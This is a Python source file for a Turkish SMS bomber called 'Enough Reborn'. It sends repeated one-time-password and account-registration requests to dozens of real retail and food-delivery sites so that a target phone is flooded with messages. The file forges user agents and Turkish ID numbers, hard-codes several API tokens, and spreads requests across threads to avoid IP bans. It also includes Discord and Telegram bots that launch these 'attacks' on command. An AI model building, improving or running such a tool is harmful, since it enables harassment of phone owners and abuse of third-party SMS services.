import requests
import threading
import random
import os
import sys
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from string import ascii_lowercase
from random import choice, randint

# Colorama initialization
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class MockColor:
        def __getattr__(self, name): return ""
    Fore = Style = MockColor()

# --- FULL SMS SENDING CLASS (From sms.py) ---
class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    def get_headers(self, referer=None, origin=None):
        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
        ]
        headers = {
            "User-Agent": choice(ua_list),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        if referer: headers["Referer"] = referer
        if origin: headers["Origin"] = origin
        return headers

    def KahveDunyasi(self):    
        try:    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = self.get_headers("https://www.kahvedunyasi.com/", "https://www.kahvedunyasi.com")
            headers.update({"X-Language-Id": "tr-TR", "X-Client-Platform": "web"})
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201, 204]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> Kahve Dünyası")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> Kahve Dünyası ({e})")

    def Wmf(self):
        try:
            headers = self.get_headers("https://www.wmf.com.tr/users/register/", "https://www.wmf.com.tr")
            data = {"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "Enough123!", "phone": "0" + self.phone}
            r = requests.post("https://www.wmf.com.tr/users/register/", headers=headers, data=data, timeout=6)
            if r.status_code in [200, 201, 202, 302]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")

    def Bim(self):
        try:
            url = "https://bim.veesk.net:443/service/v1.0/account/login"
            headers = self.get_headers("https://www.bim.com.tr/", "https://www.bim.com.tr")
            json={"phone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> BIM")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> BIM ({e})")

    def Englishhome(self):
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = self.get_headers("https://www.englishhome.com/", "https://www.englishhome.com")
            json={"Phone": self.phone, "XID": ""}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("isError") == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> English Home")
                self.adet += 1
            else: raise Exception("isError: True")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> English Home ({e})")

    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = self.get_headers("https://suiste.com/", "https://suiste.com")
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "Enough123!"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json().get("code") == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else: raise Exception(f"Code: {r.json().get('code')}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> suiste.com ({e})")

    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")

    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = self.get_headers("https://www.evidea.com/", "https://www.evidea.com")
            headers.update({"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"})
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "email_allowed": "false", "sms_allowed": "true", "password": "Enough123!", "phone": "0" + self.phone, "confirm": "true"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code in [200, 201, 202, 302]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com")

    def KimGb(self):
        try:
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
            r = requests.post(url, json={"msisdn": "90" + self.phone}, timeout=6)
            if r.status_code in [200, 201]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> Kim GB İster")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> Kim GB İster ({e})")

    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            json={"email": "", "name": "Memati", "phoneNumber": "+90" + self.phone, "surname": "Bas"}
            r = requests.post(url, json=json, timeout=6)
            if r.json().get("error") == "E-Posta veya telefon zaten kayıtlı!":
                 print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> 345dijital (Zaten Kayıtlı)")
                 self.adet += 1
            elif r.status_code in [200, 201]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> 345dijital")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> 345dijital ({e})")

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = self.get_headers("https://www.tiklagelsin.com/", "https://www.tiklagelsin.com")
            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": f"{randint(1000,9999)}-{randint(1000,9999)}", "deviceUniqueId": f"{randint(1000,9999)}-{randint(1000,9999)}", "phone": "+90" + self.phone}}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200 and "generateOtp" in r.text and r.json().get("data", {}).get("generateOtp") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> TiklaGelsin")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> TiklaGelsin ({e})")

    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = self.get_headers("https://www.naosstars.com/", "https://www.naosstars.com")
            headers.update({"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351"})
            json={"telephone": "+90" + self.phone, "type": "register"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> Naosstars")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> Naosstars ({e})")

    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = self.get_headers("https://www.koton.com/", "https://www.koton.com")
            headers.update({"Content-Type": "application/x-www-form-urlencoded"})
            data = f"first_name=Memati&last_name=Bas&email={self.mail}&password=Enough123!&phone=0{self.phone}&confirm=true&sms_allowed=true&email_allowed=true"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code in [200, 201, 202, 302]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> Koton")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> Koton ({e})")

    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            headers = self.get_headers("https://www.hayatsu.com.tr/", "https://www.hayatsu.com.tr")
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json().get("is_success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hayatsu.com.tr")

    def Hizliecza(self):
        try:
            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
            headers = self.get_headers("https://hizliecza.com.tr/", "https://hizliecza.com.tr")
            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.hizliecza.net")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.hizliecza.net")

    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            json={"methodType": "2", "mobilePhoneNumber": self.phone}
            r = requests.post(url, json=json, timeout=6)
            if "success" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobile.metro-tr.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobile.metro-tr.com")

    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")

    def Akasya(self):
        try:
            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
            headers = {"X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if "succesfully" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasyaapi.poilabs.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasyaapi.poilabs.com")

    def Akbati(self):
        try:
            url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
            headers = {"X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3"}
            json={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if "succesfully" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbatiapi.poilabs.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbatiapi.poilabs.com")

    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            headers = self.get_headers("https://www.komagene.com.tr/", "https://www.komagene.com.tr")
            json={"FirmaId": 32, "Telefon": self.phone}
            r = requests.post(url=url, headers=headers, json=json, timeout=6)
            if r.json().get("Success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com")

    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers, timeout=6)
            if r.json()["status"]== "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")

    def Tasdelen(self):
        try:
            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
            json={"phone": self.phone}
            r = requests.post(url=url, json=json, timeout=6)
            if r.json()["result"]== True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tasdelen.sufirmam.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tasdelen.sufirmam.com")

    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            headers = self.get_headers("https://www.uysalmarket.com.tr/", "https://www.uysalmarket.com.tr")
            json={"phone_number": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")

    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")

    def YilmazTicaret(self):
        try:
            url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
            headers = {"Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm"}
            data = {"fonksiyon": "customer/form/checkx", "method": "POST", "telephone": f"0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}", "token": "d7841d399a16d0060d3b8a76bf70542e"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.buyursungelsin.com")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com")

    def Beefull(self):
        try:
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url, json=json, timeout=4)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
                self.adet += 1
            else: raise
        except: print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")

    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = self.get_headers("https://www.dominos.com.tr/", "https://www.dominos.com.tr")
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json().get("isSuccess") == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> Dominos")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> Dominos ({e})")

    def DeFacto(self):
        try:
            url = "https://www.defacto.com.tr/api/user/otp"
            headers = self.get_headers("https://www.defacto.com.tr/", "https://www.defacto.com.tr")
            headers.update({"Accept": "application/json"})
            json = {"phone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201, 204]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> DeFacto")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> DeFacto ({e})")

    def Boyner(self):
        try:
            url = "https://www.boyner.com.tr/api/v1/user/otp"
            headers = self.get_headers("https://www.boyner.com.tr/", "https://www.boyner.com.tr")
            json = {"phone": self.phone, "type": "register"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201, 204]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> Boyner")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> Boyner ({e})")

    def Mavi(self):
        try:
            url = "https://www.mavi.com/api/user/otp"
            headers = self.get_headers("https://www.mavi.com/", "https://www.mavi.com")
            json = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> Mavi")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> Mavi ({e})")

    def Sok(self):
        try:
            url = "https://api.sokmarket.com.tr/api/v1/users/otp-login"
            headers = self.get_headers("https://www.sokmarket.com.tr/", "https://www.sokmarket.com.tr")
            headers.update({"X-Channel": "Web", "X-Client-Version": "1.0.0"})
            json = {"mobile_number": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> Şok")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> Şok ({e})")

    def Starbucks(self):
        try:
            url = "https://auth.sbuxtr.com:443/signUp"
            headers = self.get_headers("https://www.starbucks.com.tr/", "https://www.starbucks.com.tr")
            json = {"allowEmail": True, "allowSms": True, "deviceId": f"{randint(1000,9999)}", "email": self.mail, "firstName": "Memati", "lastName": "Bas", "password": "Enough123!", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.status_code in [200, 201, 202]:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> Starbucks")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> Starbucks ({e})")

    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": self.phone}
            r = requests.post(url, json=json, headers=headers, timeout=6)
            if r.json().get("status") == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> Porty")
                self.adet += 1
            else: raise Exception(f"Code: {r.json().get('status')}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> Porty ({e})")

    def ClickMe(self):
        try:
            url = 'https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code'
            headers = self.get_headers("https://clickmelive.com/", "https://clickmelive.com")
            headers.update({"Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc"})
            json={"phone": self.phone}
            r = requests.post(url, json=json, headers=headers, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] Başarılı! {self.phone} --> ClickMeLive")
                self.adet += 1
            else: raise Exception(f"Status: {r.status_code}")
        except Exception as e: print(f"{Fore.LIGHTRED_EX}[-] Başarısız! {self.phone} --> ClickMeLive ({e})")

# --- UTILS (From enough.py) ---
def logo():
    servisler_sms = [f for f in dir(SendSms) if callable(getattr(SendSms, f)) and not f.startswith("__") and f != "adet" and f != "get_headers"]
    print(f"""{Fore.LIGHTCYAN_EX}
 ███████╗███╗   ██╗ ██████╗ ██╗   ██╗ ██████╗ ██╗  ██╗
 ██╔════╝████╗  ██║██╔═══██╗██║   ██║██╔════╝ ██║  ██║
 █████╗  ██╔██╗ ██║██║   ██║██║   ██║██║  ███╗███████║
 ██╔══╝  ██║╚██╗██║██║   ██║██║   ██║██║   ██║██╔══██║
 ███████╗██║ ╚████║╚██████╔╝╚██████╔╝╚██████╔╝██║  ██║
 ╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
    {Fore.LIGHTWHITE_EX}Status: {Fore.LIGHTGREEN_EX}{len(servisler_sms)} Services Online {Fore.LIGHTWHITE_EX}| {Fore.LIGHTRED_EX}Enough Reborn Standalone
    """)

# --- TERMINAL MODE ---
def terminal_mode():
    servisler_sms = [f for f in dir(SendSms) if callable(getattr(SendSms, f)) and not f.startswith("__") and f != "adet" and f != "get_headers"]
    while True:
        os.system("cls||clear")
        logo()
        print(f"{Fore.LIGHTMAGENTA_EX} [1] SMS Gönder (Normal)")
        print(f"{Fore.LIGHTMAGENTA_EX} [2] SMS Gönder (Turbo)")
        print(f"{Fore.LIGHTMAGENTA_EX} [3] Geri Dön\n")
        secim = input(Fore.LIGHTYELLOW_EX + " Seçiminiz: ")
        if secim == "3": break
        if secim not in ["1", "2"]: continue

        tel_no = input(Fore.LIGHTYELLOW_EX + "Telefon (Başına +90 koymadan): ")
        if len(tel_no) != 10: print("Hatalı numara!"); sleep(2); continue
        
        mail = input(Fore.LIGHTYELLOW_EX + "Mail (Opsiyonel): ")
        try: 
            kere_input = input(Fore.LIGHTYELLOW_EX + "Kaç adet: ")
            kere = int(kere_input) if kere_input else 1
        except: kere = 1

        sms = SendSms(tel_no, mail)
        if secim == "1":
            while sms.adet < kere:
                for srv in servisler_sms:
                    if sms.adet >= kere: break
                    getattr(sms, srv)()
                    sleep(1)
        elif secim == "2":
            print(Fore.LIGHTRED_EX + "[!] Turbo Mod Aktif (Optimize Edildi)! Durdurmak için Ctrl+C")
            try:
                def work(srv):
                    try: 
                        getattr(sms, srv)()
                        sleep(random.uniform(0.1, 0.4)) # IP engellemesini önlemek için küçük bir bekleme
                    except: pass
                with ThreadPoolExecutor(max_workers=15) as executor: # Worker sayısı azaltıldı (ban riskine karşı)
                    while sms.adet < kere:
                        random.shuffle(servisler_sms)
                        list(executor.map(work, servisler_sms))
            except KeyboardInterrupt:
                print(Fore.LIGHTYELLOW_EX + "\n[!] Saldırı Durduruldu.")
                sleep(2)
        
        input(Fore.LIGHTGREEN_EX + "\nİşlem tamamlandı. Enter'a basın...")

# --- DISCORD BOT MODE ---
def discord_mode():
    try:
        import discord
        token = input(Fore.LIGHTCYAN_EX + "Discord Bot Token: ")
        if not token: return
        client = discord.Client(intents=discord.Intents.all())
        @client.event
        async def on_ready(): print(f'{client.user} Aktif!'); await client.change_presence(activity=discord.Game(name="SMS Bomber"))
        @client.event
        async def on_message(msg):
            if msg.author == client.user: return
            if msg.content.startswith("*sms "):
                try:
                    tel = msg.content.split(" ")[1]
                    await msg.channel.send(f"Saldırı başladı: {tel}")
                    sms = SendSms(tel, "")
                    servisler_sms = [f for f in dir(SendSms) if callable(getattr(SendSms, f)) and not f.startswith("__") and f != "adet" and f != "get_headers"]
                    while sms.adet < 50: # Varsayılan 50 adet
                        for srv in servisler_sms:
                            if sms.adet >= 50: break
                            getattr(sms, srv)()
                    await msg.channel.send(f"Saldırı bitti: {tel} - {sms.adet} SMS gönderildi.")
                except: pass
        client.run(token)
    except ImportError: print("Discord kütüphanesi eksik! 'pip install discord.py'"); sleep(2)

# --- TELEGRAM BOT MODE ---
def telegram_mode():
    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler, ContextTypes
        token = input(Fore.LIGHTCYAN_EX + "Telegram Bot Token: ")
        if not token: return
        async def start(u: Update, c: ContextTypes.DEFAULT_TYPE): await u.message.reply_text("Hoşgeldiniz! /sms numara")
        async def sms_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
            try:
                tel = c.args[0]
                await u.message.reply_text(f"Saldırı başladı: {tel}")
                sms = SendSms(tel, "")
                servisler_sms = [f for f in dir(SendSms) if callable(getattr(SendSms, f)) and not f.startswith("__") and f != "adet" and f != "get_headers"]
                while sms.adet < 50:
                    for srv in servisler_sms:
                        if sms.adet >= 50: break
                        getattr(sms, srv)()
                await u.message.reply_text(f"Saldırı bitti: {tel} - {sms.adet} SMS gönderildi.")
            except: pass
        app = Application.builder().token(token).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("sms", sms_cmd))
        print("Telegram bot çalışıyor..."); app.run_polling()
    except ImportError: print("Telegram kütüphanesi eksik! 'pip install python-telegram-bot'"); sleep(2)

# --- MAIN MENU ---
if __name__ == "__main__":
    while True:
        os.system("cls||clear")
        logo()
        print(f"{Fore.LIGHTYELLOW_EX} [1] Terminal SMS Bomber")
        print(f"{Fore.LIGHTYELLOW_EX} [2] Discord Bot Modu")
        print(f"{Fore.LIGHTYELLOW_EX} [3] Telegram Bot Modu")
        print(f"{Fore.LIGHTYELLOW_EX} [4] Çıkış\n")
        ana_menu = input(Fore.LIGHTCYAN_EX + " Seçiminiz: ")
        if ana_menu == "1": terminal_mode()
        elif ana_menu == "2": discord_mode()
        elif ana_menu == "3": telegram_mode()
        elif ana_menu == "4": break
